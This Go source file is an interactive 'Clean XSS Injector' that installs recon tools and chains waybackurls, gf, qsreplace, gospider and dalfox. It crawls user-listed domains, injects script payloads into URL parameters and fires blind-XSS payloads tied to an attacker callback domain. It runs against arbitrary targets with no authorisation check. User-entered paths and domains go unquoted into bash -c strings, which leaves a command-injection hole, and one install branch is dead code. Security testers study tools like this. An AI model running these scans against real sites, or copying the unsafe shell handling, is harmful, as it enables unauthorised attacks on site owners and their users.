package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"sync"
)

// Tool definitions
var tools = map[string]string{
	"httpx":       "github.com/projectdiscovery/httpx/cmd/httpx@latest",
	"waybackurls": "github.com/tomnomnom/waybackurls@latest",
	"gf":          "github.com/tomnomnom/gf@latest",
	"qsreplace":   "github.com/tomnomnom/qsreplace@latest",
	"gospider":    "github.com/jaeles-project/gospider@latest",
	"dalfox":      "github.com/hahwul/dalfox/v2/cmd/dalfox@latest",
}

func main() {
	fmt.Println("?? Clean XSS Injector - XSS Payload Hunting Tool")
	fmt.Println("==============================================")

	// Check if tools are installed
	missingTools := checkTools()

	if len(missingTools) > 0 {
		fmt.Println("The following tools are missing:")
		for _, tool := range missingTools {
			fmt.Printf("- %s\n", tool)
		}

		if askUserForInstall() {
			fmt.Println("Installing missing tools...")
			installTools(missingTools)
		} else {
			fmt.Println("Tools are required to run this script. Exiting.")
			return
		}
	} else {
		fmt.Println("All required tools are installed.")
	}

	// Show available commands
	fmt.Println("\nAvailable XSS Hunting Options:")
	fmt.Println("1. Wayback + httpx + GF + Dalfox")
	fmt.Println("2. Gospider + Dalfox")
	fmt.Println("3. Wayback + GF + Blind XSS via Dalfox")
	fmt.Println("4. Gospider + Dalfox (Deep Crawl)")
	fmt.Println("5. Dalfox Direct with Blind XSS")
	fmt.Println("h. Help")
	fmt.Println("q. Quit")

	for {
		fmt.Print("\nEnter your choice (1-5, h, q): ")
		var choice string
		fmt.Scanln(&choice)

		switch choice {
		case "1":
			runWaybackHttpxGFDalfox()
		case "2":
			runGospiderDalfox()
		case "3":
			runWaybackGFBlindXSS()
		case "4":
			runGospiderDalfoxDeep()
		case "5":
			runDalfoxDirect()
		case "h", "help":
			showHelp()
		case "q", "quit", "exit":
			fmt.Println("Exiting Clean XSS Injector. Goodbye!")
			return
		default:
			fmt.Println("Invalid option. Please try again.")
		}
	}
}

// Check if required tools are installed
func checkTools() []string {
	var missingTools []string

	for tool := range tools {
		cmd := exec.Command("which", tool)
		if err := cmd.Run(); err != nil {
			missingTools = append(missingTools, tool)
		}
	}

	return missingTools
}

// Ask user if they want to install missing tools
func askUserForInstall() bool {
	fmt.Print("Would you like to install the missing tools? (y/n): ")
	var response string
	fmt.Scanln(&response)
	return strings.ToLower(response) == "y" || strings.ToLower(response) == "yes"
}

// Install missing tools
func installTools(missingTools []string) {
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 3) // Limit concurrent installations

	fmt.Println("Installing missing tools (this may take a while)...")

	for _, tool := range missingTools {
		wg.Add(1)
		go func(tool string) {
			defer wg.Done()
			semaphore <- struct{}{}        // Acquire semaphore
			defer func() { <-semaphore }() // Release semaphore

			fmt.Printf("Installing %s...\n", tool)

			var cmd *exec.Cmd

			if tool == "uro" {
				// Special handling for uro - try pipx first
				pipxCheck := exec.Command("which", "pipx")
				if pipxErr := pipxCheck.Run(); pipxErr != nil {
					// Install pipx
					fmt.Println("Installing pipx first...")
					pipCmd := exec.Command("pip3", "install", "pipx")
					pipCmd.Stdout = os.Stdout
					pipCmd.Stderr = os.Stderr
					if pipErr := pipCmd.Run(); pipErr != nil {
						fmt.Printf("Failed to install pipx: %v\n", pipErr)
						installGouro()
						return
					}

					// Ensure pipx is in path
					ensureCmd := exec.Command("pipx", "ensurepath")
					ensureCmd.Stdout = os.Stdout
					ensureCmd.Stderr = os.Stderr
					ensureCmd.Run()
				}

				// Now install with pipx
				cmd = exec.Command("pipx", "install", "uro")
			} else {
				cmd = exec.Command("go", "install", tools[tool])
			}

			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			err := cmd.Run()

			if err != nil {
				fmt.Printf("Failed to install %s: %v\n", tool, err)

				// Try alternative method for uro if it fails
				if tool == "uro" {
					installGouro()
				}
			} else {
				fmt.Printf("Successfully installed %s\n", tool)
			}
		}(tool)
	}

	wg.Wait()
	fmt.Println("Tool installation completed.")
}

// Install gouro as a fallback
func installGouro() {
	fmt.Println("Trying alternative method: installing gouro instead (Go alternative to uro)...")
	altCmd := exec.Command("go", "install", "github.com/felipemelchior/gouro@latest")
	altCmd.Stdout = os.Stdout
	altCmd.Stderr = os.Stderr
	if altErr := altCmd.Run(); altErr == nil {
		fmt.Println("Successfully installed gouro as an alternative to uro")
	} else {
		fmt.Printf("Failed to install alternative tool: %v\n", altErr)
	}
}

// Read file content line by line
func readFileLines(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

// Get input file from user
func getInputFile() string {
	fmt.Print("Enter the path to your domains/URLs file (e.g., domains.txt): ")
	var filePath string
	fmt.Scanln(&filePath)
	return filePath
}

// Get single domain from user
func getSingleDomain() string {
	fmt.Print("Enter a single domain (e.g., example.com): ")
	var domain string
	fmt.Scanln(&domain)
	return domain
}

// Show help information
func showHelp() {
	fmt.Println("\n?? Clean XSS Injector Help")
	fmt.Println("======================")
	fmt.Println("1. Wayback + httpx + GF + Dalfox:")
	fmt.Println("   Grabs wayback URLs for domains, filters for parameters (=), applies XSS pattern using gf,")
	fmt.Println("   replaces the value with a script, and checks if the payload is reflected.")

	fmt.Println("\n2. Gospider + Dalfox:")
	fmt.Println("   Crawls and finds parameterized URLs using Gospider, replaces their values,")
	fmt.Println("   and pipes them to Dalfox for XSS testing.")

	fmt.Println("\n3. Wayback + GF + Blind XSS via Dalfox:")
	fmt.Println("   Fetches old URLs from Wayback, filters for XSS candidates, sanitizes them to allow")
	fmt.Println("   blind XSS testing, and sends to Dalfox with a callback domain for detection.")

	fmt.Println("\n4. Gospider + Dalfox (Deep Crawl):")
	fmt.Println("   Conducts a deeper crawl using Gospider and tests found URLs for XSS vulnerabilities using Dalfox.")

	fmt.Println("\n5. Dalfox Direct with Blind XSS:")
	fmt.Println("   Sends URLs directly to Dalfox for blind XSS detection using a given callback domain.")

	fmt.Println("\nRequired tools:")
	for tool := range tools {
		fmt.Printf("- %s\n", tool)
	}
}

// Run Wayback + httpx + GF + Dalfox
func runWaybackHttpxGFDalfox() {
	fmt.Println("\n[+] Running Wayback + httpx + GF + Dalfox")
	inputFile := getInputFile()

	// Check if file exists
	if _, err := os.Stat(inputFile); os.IsNotExist(err) {
		fmt.Printf("Error: File '%s' does not exist.\n", inputFile)
		return
	}

	outputFile := "xss_results_wayback_httpx.txt"
	fmt.Printf("[+] Starting scan. Results will be saved to %s\n", outputFile)

	// Check which URL optimizer is available (uro or gouro)
	var urlOptimizer string
	uroCheck := exec.Command("which", "uro")
	if uroErr := uroCheck.Run(); uroErr == nil {
		urlOptimizer = "uro"
	} else {
		gouroCheck := exec.Command("which", "gouro")
		if gouroErr := gouroCheck.Run(); gouroErr == nil {
			urlOptimizer = "gouro"
		} else {
			// Skip URL optimization if neither is available
			urlOptimizer = ""
			fmt.Println("[WARNING] Neither uro nor gouro is available. Skipping URL optimization step.")
		}
	}

	var cmdStr string
	if urlOptimizer == "" {
		cmdStr = fmt.Sprintf(`cat %s | httpx -silent -ports 80,443,8080,8443,3000,8000 | waybackurls | grep "=" | gf xss | qsreplace '"><script>alert(1)</script>' | while read url; do curl -s "$url" | grep -q "<script>alert(1)</script>" && echo "[XSS] $url"; done > %s`, inputFile, outputFile)
	} else {
		cmdStr = fmt.Sprintf(`cat %s | httpx -silent -ports 80,443,8080,8443,3000,8000 | waybackurls | grep "=" | %s | gf xss | qsreplace '"><script>alert(1)</script>' | while read url; do curl -s "$url" | grep -q "<script>alert(1)</script>" && echo "[XSS] $url"; done > %s`, inputFile, urlOptimizer, outputFile)
	}

	// Linux command
	cmd := exec.Command("bash", "-c", cmdStr)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()

	if err != nil {
		fmt.Printf("Error running command: %v\n", err)
	} else {
		fmt.Printf("[+] Scan completed. Results saved to %s\n", outputFile)
	}
}

// Run Gospider + Dalfox
func runGospiderDalfox() {
	fmt.Println("\n[+] Running Gospider + Dalfox")
	inputFile := getInputFile()

	// Check if file exists
	if _, err := os.Stat(inputFile); os.IsNotExist(err) {
		fmt.Printf("Error: File '%s' does not exist.\n", inputFile)
		return
	}

	outputFile := "xss_results_gospider.txt"
	fmt.Printf("[+] Starting scan. Results will be saved to %s\n", outputFile)

	// Check which URL optimizer is available (uro or gouro)
	var urlOptimizer string
	uroCheck := exec.Command("which", "uro")
	if uroErr := uroCheck.Run(); uroErr == nil {
		urlOptimizer = "uro"
	} else {
		gouroCheck := exec.Command("which", "gouro")
		if gouroErr := gouroCheck.Run(); gouroErr == nil {
			urlOptimizer = "gouro"
		} else {
			// Skip URL optimization if neither is available
			urlOptimizer = ""
			fmt.Println("[WARNING] Neither uro nor gouro is available. Skipping URL optimization step.")
		}
	}

	var cmdStr string
	if urlOptimizer == "" {
		cmdStr = fmt.Sprintf(`gospider -S %s -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -oP "https?://[^ ]+" | grep "=" | qsreplace -a | dalfox pipe -o %s`, inputFile, outputFile)
	} else {
		cmdStr = fmt.Sprintf(`gospider -S %s -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -oP "https?://[^ ]+" | grep "=" | %s | qsreplace -a | dalfox pipe -o %s`, inputFile, urlOptimizer, outputFile)
	}

	// Linux command
	cmd := exec.Command("bash", "-c", cmdStr)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()

	if err != nil {
		fmt.Printf("Error running command: %v\n", err)
	} else {
		fmt.Printf("[+] Scan completed. Results saved to %s\n", outputFile)
	}
}

// Run Wayback + GF + Blind XSS via Dalfox
func runWaybackGFBlindXSS() {
	fmt.Println("\n[+] Running Wayback + GF + Blind XSS via Dalfox")
	domain := getSingleDomain()

	fmt.Print("Enter your XSS hunter subdomain (e.g., yoursubdomain.xss.ht): ")
	var xssSubdomain string
	fmt.Scanln(&xssSubdomain)

	outputFile := "xss_results_blind.txt"
	fmt.Printf("[+] Starting scan for %s. Results will be saved to %s\n", domain, outputFile)

	// Linux only command
	cmd := exec.Command("bash", "-c", fmt.Sprintf(`waybackurls %s | gf xss | sed 's/=.*/=/' | sort -u | dalfox -b %s pipe -o %s`, domain, xssSubdomain, outputFile))
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()

	if err != nil {
		fmt.Printf("Error running command: %v\n", err)
	} else {
		fmt.Printf("[+] Scan completed. Results saved to %s\n", outputFile)
	}
}

// Run Gospider + Dalfox (Deep Crawl)
func runGospiderDalfoxDeep() {
	fmt.Println("\n[+] Running Gospider + Dalfox (Deep Crawl)")
	inputFile := getInputFile()

	// Check if file exists
	if _, err := os.Stat(inputFile); os.IsNotExist(err) {
		fmt.Printf("Error: File '%s' does not exist.\n", inputFile)
		return
	}

	outputFile := "xss_results_deep_crawl.txt"
	fmt.Printf("[+] Starting deep crawl scan. Results will be saved to %s\n", outputFile)

	// Check which URL optimizer is available (uro or gouro)
	var urlOptimizer string
	uroCheck := exec.Command("which", "uro")
	if uroErr := uroCheck.Run(); uroErr == nil {
		urlOptimizer = "uro"
	} else {
		gouroCheck := exec.Command("which", "gouro")
		if gouroErr := gouroCheck.Run(); gouroErr == nil {
			urlOptimizer = "gouro"
		} else {
			// Skip URL optimization if neither is available
			urlOptimizer = ""
			fmt.Println("[WARNING] Neither uro nor gouro is available. Skipping URL optimization step.")
		}
	}

	var cmdStr string
	if urlOptimizer == "" {
		cmdStr = fmt.Sprintf(`gospider -S %s -c 20 -d 3 --js --sitemap --robots | grep -oP "https?://[^ ]+" | grep "=" | dalfox pipe -o %s`, inputFile, outputFile)
	} else {
		cmdStr = fmt.Sprintf(`gospider -S %s -c 20 -d 3 --js --sitemap --robots | grep -oP "https?://[^ ]+" | grep "=" | %s | dalfox pipe -o %s`, inputFile, urlOptimizer, outputFile)
	}

	// Linux command
	cmd := exec.Command("bash", "-c", cmdStr)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()

	if err != nil {
		fmt.Printf("Error running command: %v\n", err)
	} else {
		fmt.Printf("[+] Deep crawl scan completed. Results saved to %s\n", outputFile)
	}
}

// Run Dalfox Direct with Blind XSS
func runDalfoxDirect() {
	fmt.Println("\n[+] Running Dalfox Direct with Blind XSS")
	inputFile := getInputFile()

	// Check if file exists
	if _, err := os.Stat(inputFile); os.IsNotExist(err) {
		fmt.Printf("Error: File '%s' does not exist.\n", inputFile)
		return
	}

	fmt.Print("Enter your XSS hunter subdomain (e.g., yoursubdomain.xss.ht): ")
	var xssSubdomain string
	fmt.Scanln(&xssSubdomain)

	outputFile := "xss_results_dalfox_direct.txt"
	fmt.Printf("[+] Starting direct Dalfox scan. Results will be saved to %s\n", outputFile)

	// Linux command
	cmd := exec.Command("bash", "-c", fmt.Sprintf(`cat %s | dalfox pipe -b %s -o %s`, inputFile, xssSubdomain, outputFile))
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()

	if err != nil {
		fmt.Printf("Error running command: %v\n", err)
	} else {
		fmt.Printf("[+] Dalfox direct scan completed. Results saved to %s\n", outputFile)
	}
}
